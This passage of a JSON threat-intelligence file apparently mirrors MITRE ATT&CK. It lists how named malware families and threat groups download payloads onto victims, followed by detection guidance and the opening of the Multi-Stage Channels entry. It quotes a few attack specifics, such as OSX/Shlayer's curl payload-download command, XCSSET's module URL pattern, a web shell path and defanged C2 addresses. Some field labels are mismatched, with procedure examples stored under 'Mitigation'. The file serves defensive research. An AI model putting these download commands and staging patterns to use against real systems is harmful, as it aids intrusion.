        "description": "Machete can download additional files for execution on the victim’s machine.[283]"
      },
      {
        "id": "S1016",
        "name": "MacMa",
        "description": "MacMa has downloaded additional files, including an exploit for used privilege escalation.[284][285]"
      },
      {
        "id": "S1048",
        "name": "macOS.OSAMiner",
        "description": "macOS.OSAMiner has used curl to download a Stripped Payloads from a public facing adversary-controlled webpage."
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can download additional files onto the compromised host.[286]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has downloaded additional code and files from servers onto victims.[287][288][289][290]"
      },
      {
        "id": "S0652",
        "name": "MarkiRAT",
        "description": "MarkiRAT can download additional files and tools from its C2 server, including through the use of BITSAdmin.[291]"
      },
      {
        "id": "S0500",
        "name": "MCMD",
        "description": "MCMD can upload additional files to a compromised host.[292]"
      },
      {
        "id": "S0459",
        "name": "MechaFlounder",
        "description": "MechaFlounder has the ability to upload and download files to and from a compromised host.[293]"
      },
      {
        "id": "S0530",
        "name": "Melcoz",
        "description": "Melcoz has the ability to download additional files to a compromised host.[45]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has installed updates and new malware on victims.[294][295]"
      },
      {
        "id": "G1013",
        "name": "Metador",
        "description": "Metador has downloaded tools and malware onto a compromised system.[296]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain can download files onto compromised systems.[296][286]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo has used MSI files to download additional files to execute.[297][298][299][300]"
      },
      {
        "id": "S0688",
        "name": "Meteor",
        "description": "Meteor has the ability to download additional files for execution on the victim's machine.[301]"
      },
      {
        "id": "S0339",
        "name": "Micropsia",
        "description": "Micropsia can download and execute an executable from the C2 server.[302][303]"
      },
      {
        "id": "S1015",
        "name": "Milan",
        "description": "Milan has received files from C2 and stored them in log folders beginning with the character sequence a9850d2f.[304]"
      },
      {
        "id": "S0051",
        "name": "MiniDuke",
        "description": "MiniDuke can download additional encrypted backdoors onto the victim via GIF files.[305][274]"
      },
      {
        "id": "S0084",
        "name": "Mis-Type",
        "description": "Mis-Type has downloaded additional malware and files onto a compromised host.[306]"
      },
      {
        "id": "S0083",
        "name": "Misdat",
        "description": "Misdat is capable of downloading files from the C2.[306]"
      },
      {
        "id": "S0080",
        "name": "Mivast",
        "description": "Mivast has the capability to download and execute .exe files.[307]"
      },
      {
        "id": "S0079",
        "name": "MobileOrder",
        "description": "MobileOrder has a command to download a file from the C2 server to the victim mobile device's SD card.[98]"
      },
      {
        "id": "S0553",
        "name": "MoleNet",
        "description": "MoleNet can download additional payloads from the C2.[161]"
      },
      {
        "id": "G0021",
        "name": "Molerats",
        "description": "Molerats used executables to download malicious files from different sources.[308][309]"
      },
      {
        "id": "S1026",
        "name": "Mongall",
        "description": "Mongall can download files to targeted systems.[310]"
      },
      {
        "id": "S0284",
        "name": "More_eggs",
        "description": "More_eggs can download and launch additional payloads.[311][312]"
      },
      {
        "id": "G1009",
        "name": "Moses Staff",
        "description": "Moses Staff has downloaded and installed web shells to following path C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\IISpool.aspx.[313]"
      },
      {
        "id": "S0256",
        "name": "Mosquito",
        "description": "Mosquito can upload and download files to the victim.[314]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has used malware that can upload additional files to the victim’s machine.[315][316][317][318]"
      },
      {
        "id": "G0129",
        "name": "Mustang Panda",
        "description": "Mustang Panda has downloaded additional executables following the initial infection stage.[319]"
      },
      {
        "id": "S0228",
        "name": "NanHaiShu",
        "description": "NanHaiShu can download additional files from URLs.[271]"
      },
      {
        "id": "S0336",
        "name": "NanoCore",
        "description": "NanoCore has the capability to download and activate additional modules for execution.[320][321]"
      },
      {
        "id": "S0247",
        "name": "NavRAT",
        "description": "NavRAT can download files remotely.[322]"
      },
      {
        "id": "S0272",
        "name": "NDiskMonitor",
        "description": "NDiskMonitor can download and execute a file from given URL.[60]"
      },
      {
        "id": "S0630",
        "name": "Nebulae",
        "description": "Nebulae can download files from C2.[323]"
      },
      {
        "id": "S0691",
        "name": "Neoichor",
        "description": "Neoichor can download additional files onto a compromised host.[250]"
      },
      {
        "id": "S0210",
        "name": "Nerex",
        "description": "Nerex creates a backdoor through which remote attackers can download files onto a compromised host.[170]"
      },
      {
        "id": "S0457",
        "name": "Netwalker",
        "description": "Operators deploying Netwalker have used psexec and certutil to retrieve the Netwalker payload.[324]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE can downloaded payloads from C2 to the compromised host.[325][326]"
      },
      {
        "id": "S0118",
        "name": "Nidiran",
        "description": "Nidiran can download and execute files.[327]"
      },
      {
        "id": "C0002",
        "name": "Night Dragon",
        "description": "During Night Dragon, threat actors used administrative utilities to deliver Trojan components to remote systems.[328]"
      },
      {
        "id": "S1090",
        "name": "NightClub",
        "description": "NightClub can load multiple additional plugins on an infected host.[153]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT can download files to the victim’s machine.[329][330]"
      },
      {
        "id": "S0353",
        "name": "NOKKI",
        "description": "NOKKI has downloaded a remote module for execution.[331]"
      },
      {
        "id": "G0133",
        "name": "Nomadic Octopus",
        "description": "Nomadic Octopus has used malicious macros to download additional files to the victim's machine.[332]"
      },
      {
        "id": "S0340",
        "name": "Octopus",
        "description": "Octopus can download additional files and tools onto the victim’s machine.[333][334][332]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig can download remote files onto victims.[335]"
      },
      {
        "id": "S0439",
        "name": "Okrum",
        "description": "Okrum has built-in commands for uploading, downloading, and executing files to the system.[336]"
      },
      {
        "id": "S0264",
        "name": "OopsIE",
        "description": "OopsIE can download files from its C2 server to the victim's machine.[337][338]"
      },
      {
        "id": "C0022",
        "name": "Operation Dream Job",
        "description": "During Operation Dream Job, Lazarus Group downloaded multistage malware and tools onto a compromised host.[160][339][340]"
      },
      {
        "id": "C0006",
        "name": "Operation Honeybee",
        "description": "During Operation Honeybee, the threat actors downloaded additional malware and malicious scripts onto a compromised host.[341]"
      },
      {
        "id": "C0013",
        "name": "Operation Sharpshooter",
        "description": "During Operation Sharpshooter, additional payloads were downloaded after a target was infected with a first-stage downloader.[342]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors downloaded additional files to the infected system.[343]"
      },
      {
        "id": "S0229",
        "name": "Orz",
        "description": "Orz can download files onto the victim.[271]"
      },
      {
        "id": "S0402",
        "name": "OSX/Shlayer",
        "description": "OSX/Shlayer can download payloads, and extract bytes from files. OSX/Shlayer uses the curl -fsL \"$url\" >$tmp_path command to download malicious payloads into a temporary directory.[344][345][346][347]"
      },
      {
        "id": "S0352",
        "name": "OSX_OCEANLOTUS.D",
        "description": "OSX_OCEANLOTUS.D has a command to download and execute a file on the victim’s machine.[348][349]"
      },
      {
        "id": "S1017",
        "name": "OutSteel",
        "description": "OutSteel can download files from its C2 server.[172]"
      },
      {
        "id": "S0598",
        "name": "P.A.S. Webshell",
        "description": "P.A.S. Webshell can upload and download files to and from compromised hosts.[180]"
      },
      {
        "id": "S0626",
        "name": "P8RAT",
        "description": "P8RAT can download additional payloads to a target system.[167]"
      },
      {
        "id": "S0664",
        "name": "Pandora",
        "description": "Pandora can load additional drivers and files onto a victim machine.[350]"
      },
      {
        "id": "S0208",
        "name": "Pasam",
        "description": "Pasam creates a backdoor through which remote attackers can upload files.[351]"
      },
      {
        "id": "G0040",
        "name": "Patchwork",
        "description": "Patchwork payloads download additional files from the C2 server.[352][60]"
      },
      {
        "id": "S0587",
        "name": "Penquin",
        "description": "Penquin can execute the command code do_download to retrieve remote files from C2.[353]"
      },
      {
        "id": "S0643",
        "name": "Peppy",
        "description": "Peppy can download and execute remote files.[133]"
      },
      {
        "id": "S0501",
        "name": "PipeMon",
        "description": "PipeMon can install additional modules via C2 commands.[354]"
      },
      {
        "id": "S0124",
        "name": "Pisloader",
        "description": "Pisloader has a command to upload a file to the victim machine.[355]"
      },
      {
        "id": "S0254",
        "name": "PLAINTEE",
        "description": "PLAINTEE has downloaded and executed additional plugins.[148]"
      },
      {
        "id": "G0068",
        "name": "PLATINUM",
        "description": "PLATINUM has transferred files using the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel.[356]"
      },
      {
        "id": "S0435",
        "name": "PLEAD",
        "description": "PLEAD has the ability to upload and download files to and from an infected host.[357]"
      },
      {
        "id": "S0013",
        "name": "PlugX",
        "description": "PlugX has a module to download and execute files on the compromised machine.[358][359]"
      },
      {
        "id": "S0428",
        "name": "PoetRAT",
        "description": "PoetRAT has the ability to copy files and download/upload files into C2 channels using FTP and HTTPS.[360][361]"
      },
      {
        "id": "S0012",
        "name": "PoisonIvy",
        "description": "PoisonIvy creates a backdoor through which remote attackers can upload files.[362]"
      },
      {
        "id": "S0518",
        "name": "PolyglotDuke",
        "description": "PolyglotDuke can retrieve payloads from the C2 server.[274]"
      },
      {
        "id": "S0453",
        "name": "Pony",
        "description": "Pony can download additional files onto the infected system.[363]"
      },
      {
        "id": "S0150",
        "name": "POSHSPY",
        "description": "POSHSPY downloads and executes additional PowerShell code and Windows binaries.[364]"
      },
      {
        "id": "S0139",
        "name": "PowerDuke",
        "description": "PowerDuke has a command to download a file.[365]"
      },
      {
        "id": "S1012",
        "name": "PowerLess",
        "description": "PowerLess can download additional payloads to a compromised host.[366]"
      },
      {
        "id": "S0685",
        "name": "PowerPunch",
        "description": "PowerPunch can download payloads from adversary infrastructure.[204]"
      },
      {
        "id": "S0145",
        "name": "POWERSOURCE",
        "description": "POWERSOURCE has been observed being used to download TEXTMATE and the Cobalt Strike Beacon payload onto victims.[367]"
      },
      {
        "id": "S0223",
        "name": "POWERSTATS",
        "description": "POWERSTATS can retrieve and execute additional PowerShell payloads from the C2 server.[368]"
      },
      {
        "id": "S0184",
        "name": "POWRUNER",
        "description": "POWRUNER can download or upload files from its C2 server.[335]"
      },
      {
        "id": "S0613",
        "name": "PS1",
        "description": "CostaBricks can download additional payloads onto a compromised host.[131]"
      },
      {
        "id": "S0078",
        "name": "Psylo",
        "description": "Psylo has a command to download a file to the system from its C2 server.[98]"
      },
      {
        "id": "S0147",
        "name": "Pteranodon",
        "description": "Pteranodon can download and execute additional files.[201][369][370]"
      },
      {
        "id": "S0196",
        "name": "PUNCHBUGGY",
        "description": "PUNCHBUGGY can download additional files and payloads to compromised hosts.[371][372]"
      },
      {
        "id": "S0192",
        "name": "Pupy",
        "description": "Pupy can upload and download to/from a victim machine.[373]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot has the ability to download additional components and malware.[374][375][376][377][378][379]"
      },
      {
        "id": "S0262",
        "name": "QuasarRAT",
        "description": "QuasarRAT can download files to the victim’s machine and execute them.[380][381]"
      },
      {
        "id": "S0686",
        "name": "QuietSieve",
        "description": "QuietSieve can download and execute payloads on a target host.[204]"
      },
      {
        "id": "S0629",
        "name": "RainyDay",
        "description": "RainyDay can download files to a compromised host.[323]"
      },
      {
        "id": "G0075",
        "name": "Rancor",
        "description": "Rancor has downloaded additional malware, including by using certutil.[148]"
      },
      {
        "id": "S0055",
        "name": "RARSTONE",
        "description": "RARSTONE downloads its backdoor component from a C2 server and loads it directly into memory.[382]"
      },
      {
        "id": "S0241",
        "name": "RATANKBA",
        "description": "RATANKBA uploads and downloads information.[383][384]"
      },
      {
        "id": "S0662",
        "name": "RCSession",
        "description": "RCSession has the ability to drop additional files to an infected machine.[385]"
      },
      {
        "id": "S0495",
        "name": "RDAT",
        "description": "RDAT can download files via DNS.[386]"
      },
      {
        "id": "S0153",
        "name": "RedLeaves",
        "description": "RedLeaves is capable of downloading a file from a specified URL.[387]"
      },
      {
        "id": "S0511",
        "name": "RegDuke",
        "description": "RegDuke can download files from C2.[274]"
      },
      {
        "id": "S0332",
        "name": "Remcos",
        "description": "Remcos can upload and download files to and from the victim’s machine.[388]"
      },
      {
        "id": "S0166",
        "name": "RemoteCMD",
        "description": "RemoteCMD copies a file over to the remote system before execution.[389]"
      },
      {
        "id": "S0592",
        "name": "RemoteUtilities",
        "description": "RemoteUtilities can upload and download files to and from a target machine.[318]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Remsec contains a network loader to receive executable modules from remote attackers and run them on the local victim. It can also upload and download files over HTTP and HTTPS.[390][391]"
      },
      {
        "id": "S0379",
        "name": "Revenge RAT",
        "description": "Revenge RAT has the ability to upload and download files.[392]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil can download a copy of itself from an attacker controlled IP address to the victim machine.[393][394][395]"
      },
      {
        "id": "S0258",
        "name": "RGDoor",
        "description": "RGDoor uploads and downloads files to and from the victim’s machine.[396]"
      },
      {
        "id": "G0106",
        "name": "Rocke",
        "description": "Rocke used malware to download additional malicious files to the target system.[397]"
      },
      {
        "id": "S0270",
        "name": "RogueRobin",
        "description": "RogueRobin can save a new file to the system from the C2 server.[398][399]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can retrieve additional malicious payloads from its C2 server.[400][401][34][402]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM can download additional files.[403][404]"
      },
      {
        "id": "S0085",
        "name": "S-Type",
        "description": "S-Type can download additional files onto a compromised host.[306]"
      },
      {
        "id": "S1018",
        "name": "Saint Bot",
        "description": "Saint Bot can download additional files onto a compromised host.[172]"
      },
      {
        "id": "S0074",
        "name": "Sakula",
        "description": "Sakula has the capability to download files.[405]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.[406][407]"
      },
      {
        "id": "S1085",
        "name": "Sardonic",
        "description": "Sardonic has the ability to upload additional malicious files to a compromised machine.[408]"
      },
      {
        "id": "S0461",
        "name": "SDBbot",
        "description": "SDBbot has the ability to download a DLL from C2 to a compromised host.[409]"
      },
      {
        "id": "S0053",
        "name": "SeaDuke",
        "description": "SeaDuke is capable of uploading and downloading files.[410]"
      },
      {
        "id": "S0345",
        "name": "Seasalt",
        "description": "Seasalt has a command to download additional files.[69][69]"
      },
      {
        "id": "S0185",
        "name": "SEASHARPEE",
        "description": "SEASHARPEE can download remote files onto victims.[411]"
      },
      {
        "id": "S0382",
        "name": "ServHelper",
        "description": "ServHelper may download additional files to execute.[412][413]"
      },
      {
        "id": "S0639",
        "name": "Seth-Locker",
        "description": "Seth-Locker has the ability to download and execute files on a compromised host.[414]"
      },
      {
        "id": "S0596",
        "name": "ShadowPad",
        "description": "ShadowPad has downloaded code from a C2 server.[415]"
      },
      {
        "id": "S0140",
        "name": "Shamoon",
        "description": "Shamoon can download an executable to run on the victim.[416]"
      },
      {
        "id": "S1019",
        "name": "Shark",
        "description": "Shark  can download additional files from its C2 via HTTP or DNS.[304][417]"
      },
      {
        "id": "S1089",
        "name": "SharpDisco",
        "description": "SharpDisco has been used to download a Python interpreter to C:\\Users\\Public\\WinTN\\WinTN.exe as well as other plugins from external sources.[153]"
      },
      {
        "id": "S0546",
        "name": "SharpStage",
        "description": "SharpStage has the ability to download and execute additional payloads via a DropBox API.[161][162]"
      },
      {
        "id": "S0450",
        "name": "SHARPSTATS",
        "description": "SHARPSTATS has the ability to upload and download files.[418]"
      },
      {
        "id": "S0444",
        "name": "ShimRat",
        "description": "ShimRat can download additional files.[419]"
      },
      {
        "id": "S0445",
        "name": "ShimRatReporter",
        "description": "ShimRatReporter had the ability to download additional payloads.[419]"
      },
      {
        "id": "S0217",
        "name": "SHUTTERSPEED",
        "description": "SHUTTERSPEED can download and execute an arbitary executable.[31]"
      },
      {
        "id": "S0589",
        "name": "Sibot",
        "description": "Sibot can download and execute a payload onto a compromised system.[211]"
      },
      {
        "id": "G1008",
        "name": "SideCopy",
        "description": "SideCopy has delivered trojanized executables via spearphishing emails that contacts actor-controlled servers to download malicious payloads.[6]"
      },
      {
        "id": "S0610",
        "name": "SideTwist",
        "description": "SideTwist has the ability to download additional files.[420]"
      },
      {
        "id": "G0121",
        "name": "Sidewinder",
        "description": "Sidewinder has used LNK files to download remote files to the victim's network.[421][422]"
      },
      {
        "id": "G0091",
        "name": "Silence",
        "description": "Silence has downloaded additional modules and malware to victim’s machines.[423]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can load additional files and tools, including Mimikatz.[424]"
      },
      {
        "id": "S0468",
        "name": "Skidmap",
        "description": "Skidmap has the ability to download files on an infected host.[425]"
      },
      {
        "id": "S0633",
        "name": "Sliver",
        "description": "Sliver can upload files from the C2 server to the victim machine using the upload command.[426]"
      },
      {
        "id": "S0533",
        "name": "SLOTHFULMEDIA",
        "description": "SLOTHFULMEDIA has downloaded files onto a victim machine.[427]"
      },
      {
        "id": "S0218",
        "name": "SLOWDRIFT",
        "description": "SLOWDRIFT downloads additional payloads.[31]"
      },
      {
        "id": "S1035",
        "name": "Small Sieve",
        "description": "Small Sieve has the ability to download files.[428]"
      },
      {
        "id": "S0226",
        "name": "Smoke Loader",
        "description": "Smoke Loader downloads a new version of itself once it has installed. It also downloads additional plugins.[429]"
      },
      {
        "id": "S0649",
        "name": "SMOKEDHAM",
        "description": "SMOKEDHAM has used Powershell to download UltraVNC and ngrok from third-party file sharing sites.[430]"
      },
      {
        "id": "S1086",
        "name": "Snip3",
        "description": "Snip3 can download additional payloads to compromised systems.[431][432]"
      },
      {
        "id": "S0627",
        "name": "SodaMaster",
        "description": "SodaMaster has the ability to download additional payloads from C2 to the targeted system.[167]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 downloaded additional malware, such as TEARDROP and Cobalt Strike, onto a compromised host following initial access.[433]"
      },
      {
        "id": "S0615",
        "name": "SombRAT",
        "description": "SombRAT has the ability to download and execute additional payloads.[131][149][434]"
      },
      {
        "id": "S0516",
        "name": "SoreFang",
        "description": "SoreFang can download additional payloads from C2.[435][436]"
      },
      {
        "id": "S0374",
        "name": "SpeakUp",
        "description": "SpeakUp downloads and executes additional files from a remote server. [437]"
      },
      {
        "id": "S0646",
        "name": "SpicyOmelette",
        "description": "SpicyOmelette can download malicious files from threat actor controlled AWS URL's.[438]"
      },
      {
        "id": "S0390",
        "name": "SQLRat",
        "description": "SQLRat can make a direct SQL connection to a Microsoft database controlled by the attackers, retrieve an item from the bindata table, then write and execute the file on disk.[439]"
      },
      {
        "id": "S1030",
        "name": "Squirrelwaffle",
        "description": "Squirrelwaffle has downloaded and executed additional encoded payloads.[440][441]"
      },
      {
        "id": "S0380",
        "name": "StoneDrill",
        "description": "StoneDrill has downloaded and dropped temporary files containing scripts; it additionally has a function to upload files from the victims machine.[442]"
      },
      {
        "id": "S1034",
        "name": "StrifeWater",
        "description": "StrifeWater can download updates and auxiliary modules.[443]"
      },
      {
        "id": "S0491",
        "name": "StrongPity",
        "description": "StrongPity can download files to specified targets.[444]"
      },
      {
        "id": "S0559",
        "name": "SUNBURST",
        "description": "SUNBURST delivered different payloads, including TEARDROP in at least one instance.[433]"
      },
      {
        "id": "S1064",
        "name": "SVCReady",
        "description": "SVCReady has the ability to download additional tools such as the RedLine Stealer to an infected host.[445]"
      },
      {
        "id": "S0663",
        "name": "SysUpdate",
        "description": "SysUpdate has the ability to download files to a compromised host.[350][446]"
      },
      {
        "id": "G1018",
        "name": "TA2541",
        "description": "TA2541 has used malicious scripts and macros with the ability to download additional payloads.[447]"
      },
      {
        "id": "G0092",
        "name": "TA505",
        "description": "TA505 has downloaded additional malware to execute on victim systems.[448][413][449]"
      },
      {
        "id": "G0127",
        "name": "TA551",
        "description": "TA551 has retrieved DLLs and installer binaries for malware execution from C2.[450]"
      },
      {
        "id": "S0011",
        "name": "Taidoor",
        "description": "Taidoor has downloaded additional files onto a compromised host.[451]"
      },
      {
        "id": "S0586",
        "name": "TAINTEDSCRIBE",
        "description": "TAINTEDSCRIBE can download additional modules from its C2 server.[452]"
      },
      {
        "id": "S0164",
        "name": "TDTESS",
        "description": "TDTESS has a command to download and execute an additional file.[453]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has the curl and wget commands as well as batch scripts to download new tools.[454][455]"
      },
      {
        "id": "S0595",
        "name": "ThiefQuest",
        "description": "ThiefQuest can download and execute payloads in-memory or from disk.[456]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 has downloaded additional malware and tools, including through the use of certutil, onto a compromised host .[229][457]"
      },
      {
        "id": "S0665",
        "name": "ThreatNeedle",
        "description": "ThreatNeedle can download additional tools to enable lateral movement.[266]"
      },
      {
        "id": "S0668",
        "name": "TinyTurla",
        "description": "TinyTurla has the ability to act as a second-stage dropper used to infect the system with additional malware.[458]"
      },
      {
        "id": "S0671",
        "name": "Tomiris",
        "description": "Tomiris can download files and execute them on a victim's system.[459]"
      },
      {
        "id": "G0131",
        "name": "Tonto Team",
        "description": "Tonto Team has downloaded malicious DLLs which served as a ShadowPad loader.[460]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot downloads several additional files and saves them to the victim's machine.[461][462]"
      },
      {
        "id": "S0094",
        "name": "Trojan.Karagany",
        "description": "Trojan.Karagany can upload, download, and execute files on the victim.[463][464]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper has used a delivered trojan to download additional files.[465]"
      },
      {
        "id": "S0436",
        "name": "TSCookie",
        "description": "TSCookie has the ability to upload and download files to and from the infected host.[466]"
      },
      {
        "id": "S0647",
        "name": "Turian",
        "description": "Turian can download additional files and tools from its C2.[55]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla has used shellcode to download Meterpreter after compromising a victim.[467]"
      },
      {
        "id": "S0199",
        "name": "TURNEDUP",
        "description": "TURNEDUP is capable of downloading additional files.[468]"
      },
      {
        "id": "S0263",
        "name": "TYPEFRAME",
        "description": "TYPEFRAME can upload and download files to the victim’s machine.[469]"
      },
      {
        "id": "S0333",
        "name": "UBoatRAT",
        "description": "UBoatRAT can upload and download files to the victim’s machine.[470]"
      },
      {
        "id": "S0130",
        "name": "Unknown Logger",
        "description": "Unknown Logger is capable of downloading remote files.[58]"
      },
      {
        "id": "S0275",
        "name": "UPPERCUT",
        "description": "UPPERCUT can download and upload files to and from the victim’s machine.[471]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos can use a Put command to write files to an infected machine.[472]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has dropped payload and configuration files to disk. Ursnif has also been used to download and execute additional payloads.[473][474]"
      },
      {
        "id": "S0476",
        "name": "Valak",
        "description": "Valak has downloaded a variety of modules and payloads to the compromised host, including IcedID and NetSupport Manager RAT-based malware.[475][476]"
      },
      {
        "id": "S0636",
        "name": "VaporRage",
        "description": "VaporRage has the ability to download malicious shellcode to compromised systems.[80]"
      },
      {
        "id": "S0207",
        "name": "Vasport",
        "description": "Vasport can download files.[477]"
      },
      {
        "id": "S0442",
        "name": "VBShower",
        "description": "VBShower has the ability to download VBS files to the target computer.[478]"
      },
      {
        "id": "S0257",
        "name": "VERMIN",
        "description": "VERMIN can download and upload files to the victim's machine.[479]"
      },
      {
        "id": "G0123",
        "name": "Volatile Cedar",
        "description": "Volatile Cedar can deploy additional tools.[105]"
      },
      {
        "id": "S0180",
        "name": "Volgmer",
        "description": "Volgmer can download remote files and additional payloads to the victim's machine.[480][481][482]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT can download and execute additional files.[483]"
      },
      {
        "id": "S0579",
        "name": "Waterbear",
        "description": "Waterbear can receive and load executables from remote C2 servers.[484]"
      },
      {
        "id": "S0109",
        "name": "WEBC2",
        "description": "WEBC2 can download and execute a file.[485]"
      },
      {
        "id": "S0515",
        "name": "WellMail",
        "description": "WellMail can receive data and executable scripts from C2.[486]"
      },
      {
        "id": "S0514",
        "name": "WellMess",
        "description": "WellMess can write files to a compromised host.[24][487]"
      },
      {
        "id": "S0689",
        "name": "WhisperGate",
        "description": "WhisperGate can download additional stages of malware from a Discord CDN channel.[488][489][490][491]"
      },
      {
        "id": "G0107",
        "name": "Whitefly",
        "description": "Whitefly has the ability to download additional tools from the C2.[492]"
      },
      {
        "id": "S0206",
        "name": "Wiarp",
        "description": "Wiarp creates a backdoor through which remote attackers can download files.[493]"
      },
      {
        "id": "G0112",
        "name": "Windshift",
        "description": "Windshift has used tools to deploy additional payloads to compromised hosts.[494]"
      },
      {
        "id": "S0430",
        "name": "Winnti for Linux",
        "description": "Winnti for Linux has the ability to deploy modules directly from command and control (C2) servers, possibly for remote command execution, file exfiltration, and socks5 proxying on the infected host. [495]"
      },
      {
        "id": "S0141",
        "name": "Winnti for Windows",
        "description": "The Winnti for Windows dropper can place malicious payloads on targeted systems.[496]"
      },
      {
        "id": "G0044",
        "name": "Winnti Group",
        "description": "Winnti Group has downloaded an auxiliary program named ff.exe to infected machines.[497]"
      },
      {
        "id": "G0090",
        "name": "WIRTE",
        "description": "WIRTE has downloaded PowerShell code from the C2 server to be executed.[498]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider can transfer malicious payloads such as ransomware to compromised machines.[499]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT can download files from its C2 server, including the .NET DLLs, WoodySharpExecutor and WoodyPowerSession.[500]"
      },
      {
        "id": "S0341",
        "name": "Xbash",
        "description": "Xbash can download additional malicious files from its C2 server.[501]"
      },
      {
        "id": "S0653",
        "name": "xCaon",
        "description": "xCaon has a command to download files to the victim's machine.[81]"
      },
      {
        "id": "S0658",
        "name": "XCSSET",
        "description": "XCSSET downloads browser specific AppleScript modules using a constructed URL with the curl command, https://\" & domain & \"/agent/scripts/\" & moduleName & \".applescript.[502]"
      },
      {
        "id": "S0388",
        "name": "YAHOYAH",
        "description": "YAHOYAH uses HTTP GET requests to download other files that are executed in memory.[503]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "Zebrocy obtains additional code to execute on the victim's machine, including the downloading of a secondary payload.[504][99][505][20]"
      },
      {
        "id": "S0230",
        "name": "ZeroT",
        "description": "ZeroT can download additional payloads onto the victim.[506]"
      },
      {
        "id": "S0330",
        "name": "Zeus Panda",
        "description": "Zeus Panda can download additional malware plug-in modules and execute them on the victim’s machine.[507]"
      },
      {
        "id": "G0128",
        "name": "ZIRCONIUM",
        "description": "ZIRCONIUM has used tools to download malicious files to compromised hosts.[508]"
      },
      {
        "id": "S0086",
        "name": "ZLib",
        "description": "ZLib has the ability to download files.[306]"
      },
      {
        "id": "S0672",
        "name": "Zox",
        "description": "Zox can download files to a compromised machine.[225]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell has a command to transfer files from a remote host.[509]"
      },
      {
        "id": "S1013",
        "name": "ZxxZ",
        "description": "ZxxZ can download and execute additional files.[74]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for suspicious activity associated with downloading external content."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for file creation and files transferred into the network"
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts or creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor network traffic content for files and other potentially malicious content, especially data coming in from abnormal/unknown domain and IPs."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      }
    ],
    "Subtechniques": "\nCommand and Control"
  },
  {
    "Title": "Multi-Stage Channels",
    "Code": "T1104",
    "Description": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or Fallback Channels in case the original first-stage communication path is discovered and blocked.",
    "Mitigation": [
      {
        "id": "G0022",
        "name": "APT3",
        "description": "An APT3 downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60[.]229 on TCP port 81.[1]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor.[2]"
      },
      {
        "id": "S0031",
        "name": "BACKSPACE",
        "description": "BACKSPACE attempts to avoid detection by checking a first stage command and control server to determine if it should connect to the second stage server, which performs \"louder\" interactions with the malware.[3]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "The Bazar loader is used to download and execute the Bazar backdoor.[4][5]"
      },
      {
        "id": "S0069",
        "name": "BLACKCOFFEE",
        "description": "BLACKCOFFEE uses Microsoft’s TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server and then communicates separately with that IP address for C2. If the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims’ machines.[6]"
      },
